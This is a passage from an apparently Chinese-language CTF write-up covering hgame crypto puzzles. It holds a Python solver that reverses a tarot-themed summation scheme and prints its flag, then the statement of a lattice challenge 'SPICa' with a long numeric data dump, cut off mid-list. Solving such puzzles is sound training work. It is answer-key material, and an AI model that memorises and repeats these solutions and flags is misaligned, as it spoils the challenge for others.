class="hljs-number">1</span>]<br><br>Value = []<br>cards = []<br>YOUR_initial_FATE = []<br><span class="hljs-keyword">while</span> <span class="hljs-built_in">len</span>(YOUR_initial_FATE)&lt;<span class="hljs-number">5</span>:<br>    card = random.choice(tarot)<br>    <span class="hljs-keyword">if</span> card <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> cards:<br>        cards.append(card)<br>        <span class="hljs-keyword">if</span> card <span class="hljs-keyword">in</span> Major_Arcana:<br>            k = random.choice(reversals)<br>            Value.append(tarot.index(card)^k)<br>            <span class="hljs-keyword">if</span> k == -<span class="hljs-number">1</span>:<br>                YOUR_initial_FATE.append(<span class="hljs-string">&quot;re-&quot;</span>+card)<br>            <span class="hljs-keyword">else</span>:<br>                YOUR_initial_FATE.append(card)<br>        <span class="hljs-keyword">else</span>:<br>            Value.append(tarot.index(card))<br>            YOUR_initial_FATE.append(card)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">continue</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Oops!lets reverse 1T!&quot;</span>)<br><br>FLAG=(<span class="hljs-string">&quot;hgame&#123;&quot;</span>+<span class="hljs-string">&quot;&amp;&quot;</span>.join(YOUR_initial_FATE)+<span class="hljs-string">&quot;&#125;&quot;</span>).replace(<span class="hljs-string">&quot; &quot;</span>,<span class="hljs-string">&quot;_&quot;</span>)   <span class="hljs-comment">#可知我们的目的是求YOUR_initial_FATE</span><br><br>YOUR_final_Value = Value<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">Fortune_wheel</span>(<span class="hljs-params">FATE</span>):<br>    FATEd = [FATE[i]+FATE[(i+<span class="hljs-number">1</span>)%<span class="hljs-number">5</span>] <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(FATE))]<br>    <span class="hljs-keyword">return</span> FATEd<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">250</span>):<br>    YOUR_final_Value = Fortune_wheel(YOUR_final_Value)<br><span class="hljs-built_in">print</span>(YOUR_final_Value)<br>YOUR_final_FATE = []<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> YOUR_final_Value:<br>    YOUR_final_FATE.append(tarot[i%<span class="hljs-number">78</span>])<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Your destiny changed!\n&quot;</span>,<span class="hljs-string">&quot;,&quot;</span>.join(YOUR_final_FATE))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;oh,now you GET th3 GOOd lU&gt;k,^^&quot;</span>)<br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">Oops!lets reverse 1T!</span><br><span class="hljs-string">[2532951952066291774890498369114195917240794704918210520571067085311474675019, 2532951952066291774890327666074100357898023013105443178881294700381509795270, 2532951952066291774890554459287276604903130315859258544173068376967072335730, 2532951952066291774890865328241532885391510162611534514014409174284299139015, 2532951952066291774890830662608134156017946376309989934175833913921142609334]</span><br><span class="hljs-string">Your destiny changed!</span><br><span class="hljs-string"> Eight of Cups,Ace of Cups,Strength,The Chariot,Five of Swords</span><br><span class="hljs-string">oh,now you GET th3 GOOd lU&gt;k,^^</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br></code></pre></td></tr></table></figure><p><strong>分析：</strong></p><p>重点在于逆<code>YOUR_initial_Value</code>来求<code>Value</code>。</p><p>假设<code>YOUR_initial_Value</code>上一状态为<code>a,b,c,d,e</code>,则下一状态为<code>a+b,b+c,c+d,d+e,e+a</code>，所以逆向<code>(a+b)-(b+c)+(c+d)-(d+e)+(e+a)//2=a</code>来分别求上一状态的<code>a,b,c,d,e</code>，循环250次即可得到<code>Value</code>。</p><p>然后按条件拼接，即可得到flag。</p><p><strong>解答：</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#提取信息，分析所需量，再逆向分析如何求得所需值</span><br>Major_Arcana = [<span class="hljs-string">&quot;The Fool&quot;</span>, <span class="hljs-string">&quot;The Magician&quot;</span>, <span class="hljs-string">&quot;The High Priestess&quot;</span>,<span class="hljs-string">&quot;The Empress&quot;</span>, <span class="hljs-string">&quot;The Emperor&quot;</span>, <span class="hljs-string">&quot;The Hierophant&quot;</span>,<span class="hljs-string">&quot;The Lovers&quot;</span>, <span class="hljs-string">&quot;The Chariot&quot;</span>, <span class="hljs-string">&quot;Strength&quot;</span>,<span class="hljs-string">&quot;The Hermit&quot;</span>, <span class="hljs-string">&quot;Wheel of Fortune&quot;</span>, <span class="hljs-string">&quot;Justice&quot;</span>,<span class="hljs-string">&quot;The Hanged Man&quot;</span>, <span class="hljs-string">&quot;Death&quot;</span>, <span class="hljs-string">&quot;Temperance&quot;</span>,<span class="hljs-string">&quot;The Devil&quot;</span>, <span class="hljs-string">&quot;The Tower&quot;</span>, <span class="hljs-string">&quot;The Star&quot;</span>,<span class="hljs-string">&quot;The Moon&quot;</span>, <span class="hljs-string">&quot;The Sun&quot;</span>, <span class="hljs-string">&quot;Judgement&quot;</span>,<span class="hljs-string">&quot;The World&quot;</span>]<br>wands = [<span class="hljs-string">&quot;Ace of Wands&quot;</span>, <span class="hljs-string">&quot;Two of Wands&quot;</span>, <span class="hljs-string">&quot;Three of Wands&quot;</span>, <span class="hljs-string">&quot;Four of Wands&quot;</span>, <span class="hljs-string">&quot;Five of Wands&quot;</span>, <span class="hljs-string">&quot;Six of Wands&quot;</span>, <span class="hljs-string">&quot;Seven of Wands&quot;</span>, <span class="hljs-string">&quot;Eight of Wands&quot;</span>, <span class="hljs-string">&quot;Nine of Wands&quot;</span>, <span class="hljs-string">&quot;Ten of Wands&quot;</span>, <span class="hljs-string">&quot;Page of Wands&quot;</span>, <span class="hljs-string">&quot;Knight of Wands&quot;</span>, <span class="hljs-string">&quot;Queen of Wands&quot;</span>, <span class="hljs-string">&quot;King of Wands&quot;</span>]<br>cups = [<span class="hljs-string">&quot;Ace of Cups&quot;</span>, <span class="hljs-string">&quot;Two of Cups&quot;</span>, <span class="hljs-string">&quot;Three of Cups&quot;</span>, <span class="hljs-string">&quot;Four of Cups&quot;</span>, <span class="hljs-string">&quot;Five of Cups&quot;</span>, <span class="hljs-string">&quot;Six of Cups&quot;</span>, <span class="hljs-string">&quot;Seven of Cups&quot;</span>, <span class="hljs-string">&quot;Eight of Cups&quot;</span>, <span class="hljs-string">&quot;Nine of Cups&quot;</span>, <span class="hljs-string">&quot;Ten of Cups&quot;</span>, <span class="hljs-string">&quot;Page of Cups&quot;</span>, <span class="hljs-string">&quot;Knight of Cups&quot;</span>, <span class="hljs-string">&quot;Queen of Cups&quot;</span>, <span class="hljs-string">&quot;King of Cups&quot;</span>]<br>swords = [<span class="hljs-string">&quot;Ace of Swords&quot;</span>, <span class="hljs-string">&quot;Two of Swords&quot;</span>, <span class="hljs-string">&quot;Three of Swords&quot;</span>, <span class="hljs-string">&quot;Four of Swords&quot;</span>, <span class="hljs-string">&quot;Five of Swords&quot;</span>, <span class="hljs-string">&quot;Six of Swords&quot;</span>, <span class="hljs-string">&quot;Seven of Swords&quot;</span>, <span class="hljs-string">&quot;Eight of Swords&quot;</span>, <span class="hljs-string">&quot;Nine of Swords&quot;</span>, <span class="hljs-string">&quot;Ten of Swords&quot;</span>, <span class="hljs-string">&quot;Page of Swords&quot;</span>, <span class="hljs-string">&quot;Knight of Swords&quot;</span>, <span class="hljs-string">&quot;Queen of Swords&quot;</span>, <span class="hljs-string">&quot;King of Swords&quot;</span>]<br>pentacles = [<span class="hljs-string">&quot;Ace of Pentacles&quot;</span>, <span class="hljs-string">&quot;Two of Pentacles&quot;</span>, <span class="hljs-string">&quot;Three of Pentacles&quot;</span>, <span class="hljs-string">&quot;Four of Pentacles&quot;</span>, <span class="hljs-string">&quot;Five of Pentacles&quot;</span>, <span class="hljs-string">&quot;Six of Pentacles&quot;</span>, <span class="hljs-string">&quot;Seven of Pentacles&quot;</span>, <span class="hljs-string">&quot;Eight of Pentacles&quot;</span>, <span class="hljs-string">&quot;Nine of Pentacles&quot;</span>, <span class="hljs-string">&quot;Ten of Pentacles&quot;</span>, <span class="hljs-string">&quot;Page of Pentacles&quot;</span>, <span class="hljs-string">&quot;Knight of Pentacles&quot;</span>, <span class="hljs-string">&quot;Queen of Pentacles&quot;</span>, <span class="hljs-string">&quot;King of Pentacles&quot;</span>]<br>Minor_Arcana = wands + cups + swords + pentacles<br>tarot = Major_Arcana + Minor_Arcana<br><br>Value=[]<br>YOUR_initial_FATE=[]<br>YOUR_final_Value=[<span class="hljs-number">2532951952066291774890498369114195917240794704918210520571067085311474675019</span>, <span class="hljs-number">2532951952066291774890327666074100357898023013105443178881294700381509795270</span>, <span class="hljs-number">2532951952066291774890554459287276604903130315859258544173068376967072335730</span>, <span class="hljs-number">2532951952066291774890865328241532885391510162611534514014409174284299139015</span>, <span class="hljs-number">2532951952066291774890830662608134156017946376309989934175833913921142609334</span>]<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">re_Fortune_wheel</span>(<span class="hljs-params">FATE</span>):<br>    FATE[<span class="hljs-number">0</span>] = (FATE[<span class="hljs-number">0</span>]-FATE[<span class="hljs-number">1</span>]+FATE[<span class="hljs-number">2</span>]-FATE[<span class="hljs-number">3</span>]+FATE[<span class="hljs-number">4</span>]) // <span class="hljs-number">2</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>,<span class="hljs-number">0</span>,-<span class="hljs-number">1</span>):<br>        FATE[i]=FATE[i]-FATE[(i+<span class="hljs-number">1</span>)%<span class="hljs-number">5</span>]<br>    <span class="hljs-keyword">return</span> FATE<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">250</span>):<br>    YOUR_final_Value = re_Fortune_wheel(YOUR_final_Value)<br><br><span class="hljs-built_in">print</span>(YOUR_final_Value)<br>Value=YOUR_final_Value<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> Value:<br>    <span class="hljs-keyword">if</span> i &lt; <span class="hljs-number">0</span>:<br>        i = i ^ -<span class="hljs-number">1</span><br>        <span class="hljs-built_in">print</span>(tarot[i])<br>        YOUR_initial_FATE.append(<span class="hljs-string">&quot;re-&quot;</span>+tarot[i])<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-built_in">print</span>(tarot[i])<br>        YOUR_initial_FATE.append(tarot[i])<br><br>FLAG=(<span class="hljs-string">&quot;hgame&#123;&quot;</span>+<span class="hljs-string">&quot;&amp;&quot;</span>.join(YOUR_initial_FATE)+<span class="hljs-string">&quot;&#125;&quot;</span>).replace(<span class="hljs-string">&quot; &quot;</span>,<span class="hljs-string">&quot;_&quot;</span>)<br><span class="hljs-built_in">print</span>(FLAG)<br><span class="hljs-comment">#hgame&#123;re-The_Moon&amp;re-The_Sun&amp;Judgement&amp;re-Temperance&amp;Six_of_Cups&#125;</span><br></code></pre></td></tr></table></figure><h2 id="6-SPICa"><a href="#6-SPICa" class="headerlink" title="6.SPICa"></a>6.SPICa</h2><p><strong>题目：</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> getPrime, long_to_bytes,bytes_to_long<br><span class="hljs-keyword">from</span> secrets <span class="hljs-keyword">import</span> flag<br><span class="hljs-keyword">from</span> sage.<span class="hljs-built_in">all</span> <span class="hljs-keyword">import</span> *<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">derive_M</span>(<span class="hljs-params">n</span>):<br>    iota=<span class="hljs-number">0.035</span><br>    Mbits=<span class="hljs-built_in">int</span>(<span class="hljs-number">2</span> * iota * n^<span class="hljs-number">2</span> + n * log(n,<span class="hljs-number">2</span>))<br>    M = random_prime(<span class="hljs-number">2</span>^Mbits, proof = <span class="hljs-literal">False</span>, lbound = <span class="hljs-number">2</span>^(Mbits - <span class="hljs-number">1</span>))<br>    <span class="hljs-keyword">return</span> Integer(M)<br><br>m = bytes_to_long(flag).bit_length()<br>n = <span class="hljs-number">70</span><br>p = derive_M(n)<br><br><br>F = GF(p)<br>x = random_matrix(F, <span class="hljs-number">1</span>, n)<br>A = random_matrix(ZZ, n, m, x=<span class="hljs-number">0</span>, y=<span class="hljs-number">2</span>)<br>A[randint(<span class="hljs-number">0</span>, n-<span class="hljs-number">1</span>)] = vector(ZZ, <span class="hljs-built_in">list</span>(<span class="hljs-built_in">bin</span>(bytes_to_long(flag))[<span class="hljs-number">2</span>:]))<br>flag=long_to_bytes(<span class="hljs-built_in">int</span>(<span class="hljs-string">&#x27;&#x27;</span>.join(A[i])))<br>h = x*A<br><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;data.txt&quot;</span>, <span class="hljs-string">&quot;w&quot;</span>) <span class="hljs-keyword">as</span> file:<br>    file.write(<span class="hljs-built_in">str</span>(m) + <span class="hljs-string">&quot;\n&quot;</span>)<br>    file.write(<span class="hljs-built_in">str</span>(p) + <span class="hljs-string">&quot;\n&quot;</span>)<br>    <span class="hljs-keyword">for</span> item <span class="hljs-keyword">in</span> h:<br>        file.write(<span class="hljs-built_in">str</span>(item) + <span class="hljs-string">&quot;\n&quot;</span>)<br></code></pre></td></tr></table></figure><p>其中<code>data.txt</code>内容为</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs context">(20469155492003601253253155553986803208931503654660710348720234166881649344003987262947017659012241047835048808070655285602897209239858740637878468266658899337230431317158339301884716019022543563824842749256770110913729930512649260804, 20061197539347089441548703718074268696982927733926399966893938885418017706383655096958576679109275153818455164325651467862757293092935593603331322600268652102317484783972009137643693799482954597365244794142123800753823881292602536480, 20449460766608148327819595887200586456206801278670684512632410913015490167503229582572274670752456522031099839096710051732743590814126659553219421423179332067697185796944680381658040503559588413035145948011713429631258754626251809510, 8694899395827009396141425992800033658778511870582271935710336140733986029271840480988700276909069199154936459475590420059851372448080387583101099303513327440738409895238607476203278712316251695883695113189088200686962847017765865251, 17498906738048927737996405866022970301450352038432120213930838838210038594926299429345553642022023354628862755091766856471553830387207275486875845428629363403317202957206875712023311105409026776222751170693634497194866213310044491948, 21299762658878585689792741107233334119508283391034542047533549461069861697448477916998731369486958411519583373650555867155855962437320409451328328158651213135213221691391305300586647640883613895924445303848945011091274872544725674414, 13858127090108368287746753156610976181884852029313352847097417269439999009242391680724254761571841185603751824488440165104153860614293879561204207753769517496283139692448618313378608851838592204671380865578837501521485226960295757131, 606107901015597672365982103377292862084693785965621044158858796689187941648736569096576321682310287031175045717941165527209428043020224184139162372752993919547870816012630061403517257290792929118011920477984972488980800309428929138, 16411347559169875469676322308290176281268630976465248631394286269278754960475346068565041099592979349979405282500383230219337689652572250821233598049978719348544790979587439571926076421698781802827344619141310395216702580071924399522, 6068129514673183503857587322729184998437772152551135658369680702133087671031996497962264049216246290631119377494262423727768860757742407967523061034172791840869912562774945606863954031992955819024967183759253919768822212999747782744, 16164073883659743891300469301841345466013040331496294498459841128458772221808605865298982279094019325297165362518613472961615756988375470180863560145427159107654477630571820179272488975849163426474631458599008988483395281798203200528, 6002652834833034433754084876025091748505356485760658745433173659340361267044983148952514860044218624345794714339893198968695437915359546317081144940354972707822464098838782671025813140852500245911841467802762732970205945777188441808, 17671459116121703756342696273829703490771262874572413082113674648287158047430332224637950989312667436860899021459708831070319841598164702019251450606454194564607879044661224315550514675652908609424461409598055757760711713272045049260, 9747804618981818225871997793952044666360767497788933437958387359050267555950930083105832397549316456989456304967283430526550121320745106610566272812291168897483422111931300711618308924263505765555678625775964949832562993340397250411, 21996324872073077242827998678880398901946388402016282475335311894567710762615152283467554531548297081386048827720410652120091647717684967177129064563480634873781425892452230881151261828547497099982851340353851101348946158575303726724, 20241128353291496652549108347619870477868850796680814076775175545760753973504668850036916374732720117160823389137853705825323283084380525440155558201212646427779126805749122859405488144164760267716232853839558997235342814050866837305, 13077656588899945700177181105263191868661064142860342679420184386239288545559858208951244435002966218243471420411045127025170552814160049125443370520964733258446212562129228879028530411822623695945498142516847896364762727423847457569, 7071530328065960890228453106008174199753371584339217118863740503556709237910489181283781927314970563878932442685277071347084354303239011911501455742585794028015220762730525765723336697380407902300153076264167533419216642860030224808, 22629252419865938253406009966521328587876533319128691562733593432194850726544929405088413178711982271889635298452313176698526192124305038839672198237812975135604141185210235559237447902236397265515318102940456244538398518752792480319, 5761459282176273118441944774799317407926062706007941700537400300748276958322349624237180755323800649847915919270480127859496807988229286598479624333300775674629423967322510405098758253061619727977005010935095672626407042895060271117, 13639378161376676791792650903794774452153629456935313476059754419699524574293526097694165098576687387486041665215960405733414879557245739928959501291435121608217008600392918108625339394853036499361173570509333162629246799468258136355, 1112221399019911081496513796105161716836267107501837651409516901292548472550496647130548616639784532217354650999157000279855022754714713097738729659495163953274484703014544784112610298442477231451271844048275322265529309125867188484, 12169161457053461668887038869671670176419946971662802953933166632081503259881448728851846332111194017082971192703865066066994163285010795828715477686499512514182295671281701232618183396077110570747529444745554508737426539555889099083, 11995511934849768905988062930456188671563166274831822681485210668895901448904842487096473591287554694509756168119490699415704136424403683840102743199694489304702405180406601329931714339410923612708808717358223085506757046662329629503, 13398528474737208001694948941230339341569100018647773619061861109738576104252100110443962069174319732180553417809151715735410100005179978063724591835291397314433312440421293983105825390167635459002960994550698739443052006993415149287, 21685721078976945602014626559051952462522937081933691461596237088189849657600841978193227429482306484131038624804443150311960061590035031144063153270840224125769186685588909207004132946200580900994078282900107456593588235003169921354, 21958932659990459795087732047584541007461325015275566949343681883128871386631056478783893068511478481080998508038344707524693059394150326940234855081823341566958854943322931261168562807321821084640569487228751077318094170704981650643, 18575326074968673858478938102428524301651676277226235867758079277741745360252102636120213638047957826270155136845469846718570511376252915803608625919614831191687134838436838444619000754054647327991321858217571418142823485948838843485, 21925408319719932198647415634718243407859189936679904356040860926584581042313625039619815019247876519120113207553707089727019778893587018690751305364116444902853587524322159019276550794203235986634843194549273092242442491313448819261, 21971769237171245388162249651275023141695912811218668240216220140957909617367793495291879198350993947099136765615466319867553659408044799043226321654345805093608432328775587162697826122051456089057951721736470156996789589476553105264, 11663665652950097951023874167071177053010440547278309973779798672676245675511213044752231769369800098096803991421401406373428185323198016967614776368177594490205473987491609921616943160817435319509156480489438442748695594208064506220, 8571733767532539591744305084238785438241372113715037973018068103542160069189369810177762541226540971969214853589594936813485292570840550755458909361226931687465304387382031888400449142008298116395068621612620111710861173184866936140, 7265641014493092305952899792692591083374900624337072072988050601814681241595404157641546803250164823540836286168102490427911208624069282838605171970733970339707601992725288390921333947799040016958678972693235850470014270495531454783, 18357683019971557309259589537387305852885630835264669230196131340413934504145103735168294472683744065174013315114812930463567210171038311927245433959034948205776155437226711665133074869096527958147737755278545942090787842643719386293, 11249630823936690987701184435328330983163223168635101989339377911187086984695870497253721111980469167097885275676200751043669504762094425614665999696903436973710297025883232331081137662411660725420763463582758176584701928482618894781, 21368417704130086095517329969849814675572842583190085389984103090985523417424304950647847490274582711171880575904265538743919551938416088883734546870704471113682032872096669715559005389583617506786922899538736534449123490145292870717, 14804820832711028510069420293910842363490984270818804823036282440726358025681287768311485300453811070788732988003156703771994750175077965636968452087698951366737342420716417627361539128824909909441296599842507450408639167847785653915, 10434593401661546638239269531721470859924069355256379358171970711096840647467279929406877589003350835919284031476862418858161422460097377292030151489346187334893502923880428533662123412400043690091517722265611541955158862687687083713, 24561443937015608720032402685089937637576551127866411331840220467266147984636152386876296689017192384827778734671122241130228223938051376943961096583907106197792850273311466092875658575488249813416281385686228639897799476137433072794, 18809508978562914770986641825424844673983326011247074637810890215219273029154108492496227431003955064765815763011903046546663244351135252376892253084070542641533081339319510865846592705413531461782231583683139065833462426977193323114, 1170325200926282785717575909542245218787696779459745550244912972650806869414330169502410895858680097983058617766512675739980564138645468322689195204967563486996177593733827238558844633804910336361508567070012845430162557209140318922, 9099530973344423583417798796448265698513331818761124724904157320649249490671748034442773080315290728734123593584766820587431677397350547048991745367397003023697063690573732401873466117208072387527262379544046633911232863713321651057, 6186545629812301877416853524734068114160450574994337117451587850263036761908385044092582990344042147406495912347645194115630652437606943173745789382845771049426443196019424697520894541338185145315971072044570777761063733877553713897, 18998733646999927412724741294417250892695086218116871981646202453146130670287277614970454171035798941213673467661889691048080971104465387696449499673490777958698659977825222598637449610957807490964624239691466685216040180063226979122, 2029035413823102082844939452656558074099805593476575872183225270283922006193130394920312821210960344438963206668816623318138806516660963226561860797911308864515985218753289984687939495010747187617345807068432674609822226022395002612, 1224334924830478941430540036421292246508644320238722677095883999889500298055876272715003687287887258419587507272093701524018402394087314059455381046013880303534485492492854314287356722191065404686438496257734600194353825409365914860, 15388830123476635874371535682309831543921413772062742670104698630978096538706065152811565310857194947646535508434358944071335015150277106407625487947363537743602712388716945337353159986787039117453435890006787376090096478885097896793, 10420053457335214342250034515332590797688043330675602278978659239127226996657084329075623919952172290482707420754415548245461942799120532008714972162634055331774926378534698291836555381029033314988303673575302329970048819875247229179, 12996570101872386881673806472032213506289839322758639432467242407197962401207255061640708238859358713382396645910306730272104173292864961862992132326434563495453537396958298185516874532647829493332700756725404634790257544413340701179, 11310001007421937130740204981515298136120181111962805563938085404289034278582061516301247258497064123414338657565189590291572623864937738084898059354622789358315367559028252287238789841719507080364615405563645390035528060316587102434, 7649920628929819175111413039486903286582015040923724934131761955991728816695088157076979052445031028120246103984026955901706105551535103282597498033031299709784514740469952209886314525277234547727841567842751063166501691717457807447, 8282767661876353703033480225670583969116738681062155629579190289397580081693316541581172493468366688140769336848827009811751348916039495262878858557738835369246631011150499694799485418164185557834866797870483707948444235231858169626, 10348065215991838887653401510489462098163485305574734545999066167894062235647455464256295931687781439097474305106334560598277885818537337701043155862614830925253569580192693898982318220593792046251125806231585329780902132617095557605, 11280967838102140047754377333560306350439648795137561969675963243081381329614099288939779782707558436465906221877404058208128414128559781592656246480955369758626788333375306898903783463959673000218175927160948442088191543414186131128, 11818929318729599124873943942145086021537273013997542692590943191077407938431043519607803418206555258214868688916182982805626078211252859082557253484889098137542929253460999852448424761935728458750150144937944771790308225982842690991, 5412969967721429139669566091956620099392941108847901064147423662180279827506836216754081912452764251675143575201910182189452840950356093575193249038624088662404268095962548749560674786705087512264668188729966989099888520624252744742, 17547356830409485892450749625199098509352498837601257846778404113094407637374346871392480581359187302653977880177675827091282945951962337410850311708191191160617963235512211658386260536823783677847875240999663432436509923589359888700, 8591887831833320840353196012263813111833998698446912587048628554388758958894496922493509033622609997670078612331200032453354380661501616871254995529921741954557910165239506265116743029658460390005477758921580324576966499950007047698, 24240608152025765890027400489331384103622640389639440068870645610439083379801706312111003846522258870692561041435455283169383633954853734692273153399247032151636823004018903792154640252253321042038217671452847628056591095001306376447, 18175238845322126323124732491839020080710712641999842067614816417084136046584647549081884372712146959940542383332663098640914320062272677772398521802893135140152503676658094543636706418059620569628737841646560680792630698212823857262, 10173862342693636575822816691492648273969020863129335004286001570695771568655492268044889845820019987659485915423299727906247618142386037838017456563194751538355466980296232841821674366111391576715244751705262011350337874749069345128, 17662887672308755659019635470333733858782416229711314422114693688837435216071004353298349767965595195988075045297248229654838457705997370106886962462023530886801849382037053188597909092732733084276903712706650614116210171460124448702, 12181524874770358579756085310138062154649043402053826988100381472344586613507823529632552464702544146652926312223695774383330894873770697330113566788363326971512196767946895811541430690548268356821209678371607727953997755838859126774, 11706994803516619040652442122624584733481017689525911051638928911326046116787740449573218360698003304996969933288041344857060888292758795645873721224079904632765180343552430630220956988207594755397804226083803193344994676329154327493, 8402357024978800071132055381314495648044905341576271257490683211086187354513127161690622199664304716824213610566304398546880266690789434430387528988209454626947248456097541304971867186772981230342257502227623573405137627210448823142, 13448814958668457684435846084935312650492724089658173841576258956348433114343610821298085173624638488238498589587758466360130338576374710075452327343150526934585873779496035836251602780112344762888078216555506331950896199565104006397, 23261851067858529243006512692328544765212250343687275283881011048369283487674444025254618141024372715313068675809489228084809200986696814193106301463035744067133170413056991023684452021013779169832348352784939483901536220423645197942, 2956461782787803412373184373521537264070982785668285831540757975387873992581341347760818916518443181764106275140479051787993901624417517942973131286068209774333764601237951091135348213764981692825938722977028088836454760352308033758, 3064486829635307133829604105999736772476219409968765985793477839736080127528728977191920114031725863884495929381858399046617507423360505816138935964152136380493092256651231150405966672895186096713142246153609317333657783049782151637, 10534802040612029540164483914330039254596233735171946359486562702340646071277688198935825397890574505178778613602867388545647349934716384895425051636497444634355043931879515977147131722039200347425808771386164417873392627039032929381, 16347587561440747118213871772022312563284652196262767324725458541109438659123670691624550736479719729504505614345452675461481177780240509736905011159885741573570625495043362505744257188005059869496076647939661464052864550390489436392, 932904564223742245423974397013211219322210230063409757135997988238048200833511900713764471854227396545059725844299953686973316362284758928784205613692959818986324717887966604059912158445010080457313116226499514698345116888739045201, 14155784829547910297069256239291885565427894076067719732956480982423435038774293432631990332881685973262975579857568134342058023430988483873438365184934853154265957089486695576174902453654823300612278786604052983027801579290159697757, 15059083507189045339756950559733288471657088114328896031836676598008347915133424684726963231247503783837186267424615012969099328203791879946151584653751983269080942728473598803375881811206929641186341006775658793858164370672638305414, 24050946955204789955533896427147712239350820947048633709193663894730552442910167865457955759634279229427681904250200157386924869101980949385253708656818328215342828689475987104598173819168455976517935776911361022122188385844429827861, 19717014416567816150124583987528154859466839421475505938275277134544233978125970101441724416647563320808697850421129369459770642837401448140038995613160278102100098417142249160683605942010321574730955450415122680160957836958254976336, 18341739025196342781439155614541180114644324261593971049987391428771657889467166499305558227635786922038300709465635665032362788821657236521443750938108440264564014080412870675324633423190226880338075753190002816740212167912541667386, 1813015948270605170494327027462767927668238016932441018204770850364166891479780348149629127108953561818359981896571545563617551207948156571122643027237671390832571624849892766565662348404168867487258425853064191070395435566239448528, 1703147790278812545808919311803253465091977239190220478003554114391300310923920435402284572213975190078137810042295522772486405957891397177306562281878529791622615529533777964508592563167873221257377134938914666430743351377618599468, 6278178489775796378230960195168194198865191514369599946855978876059738107235833955372780564515702681152913705996119810470327292606622329414011316101619726547400486206707034436148811872252943718668515788898176009551715308155411378252, 18502372570762310433863217616808095626038090932776074429027848581566215187912012261455455254801851855136832053610149165093284302575637475929697357817164914767314039550045344473538968895886764268535726243745335200504802864455745224374, 4619546424150636720632675449805339943017962539019526400964585316199619112511814181720051470848623690283063163236111719759442441616569278847685187351643033457613638640496754781862046330458169376039112280170067629393555816168818241121, 17415120259263326575917785021419190975482450501413944929888356972186654579803176474572508975215766509194009235591715149336564009819560581298723878336153312453947335918616023490225580430289839613029201222545734451097726880722839921382, 8307522287111865592770453226202115257484524653842503182672038744879218056275899543441543776625702705787596409072729458316533724848741039140250187914824007142564158445077159333307590448478263879269330063036285504424990516198257896295, 11263353891678243397276227460314841929873607735065191631233072436184881556807080115175345410349873166932751571268937511388565445447370133162623474541842794012489039636114698489895111355542309742024144040488016432324050920900295291917, 22637221521096771355782848874319356640240782235023169163186886225331051134680206995051142472351972293320891064080813070515162355530485444273200297804821736770540507890630957957945276656133277989360715398965382403686702660132053087389, 17919419877135534987371117199483506832865643179065513875403972803516315262685396424216812524399278928565319596834323499540921207386454692592496134156868095555234425205678332118842419128184729949597616863672987401083957030450961088118, 6084785464319055531520936804008603920136226720135667541062857654162604072088374635967414294340045316322725709290667559576429084868775969096858901672894136646463280390764523549103315360820057333674907169174163429153014379285872747201, 22582646848247815349822384029625982294969862652773702071458460690402019599859783915087863321522598200340080081814722953057928887642522789124256212970552071481336495429114943130059072461748175646464632989698260874422879732797887630047, 18669626144014838256754393744104130472295922668789204770557829273317529078229484347843108989561950816009995418160306613843824685195742442008837587483298470746325730371307237685260665649724430226456422634290254179870262594544431983580, 20052406002140826214070462061355742833483311314204273816436922246583813045591993339752776465796599006048131075796594497697843310687048655947142956234427753793119501583467069339507721514048187534341243065632056453879312603380628033984, 8536998978578217458444546841067601712321613656238053987413723752276637535354443999372125303631295704610057669756260574243930397078353340155663182523975349073323122272823468525187727995554596366377566035875710779754713058741421952297, 